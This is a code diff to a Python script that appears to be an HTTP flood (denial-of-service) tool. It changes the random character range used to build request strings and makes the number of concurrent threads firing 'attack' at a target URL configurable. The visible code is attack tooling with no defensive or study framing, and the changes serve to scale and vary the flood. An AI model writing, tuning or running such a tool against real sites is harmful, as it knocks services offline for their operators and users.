@@ -51,7 +51,7 @@ def set_safe():
 def buildblock(size):
     out_str = ''
     for _ in range(0, size):
-        a = random.randint(65, 95)
+        a = random.randint(90, 190)
         out_str += chr(a)
 
     return(out_str)
@@ -139,9 +139,9 @@ if __name__ == "__main__":
     monitor_thread = Thread(target=monitor_requests, daemon=True)
     monitor_thread.start()
     
-    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_Num) as executor:
         try:
-        	futures = [executor.submit(attack, url) for _ in range(100)]
+        	futures = [executor.submit(attack, url) for _ in range(thread_Num)]
         	concurrent.futures.wait(futures)
         except KeyboardInterrupt:
         	set_flag(2)
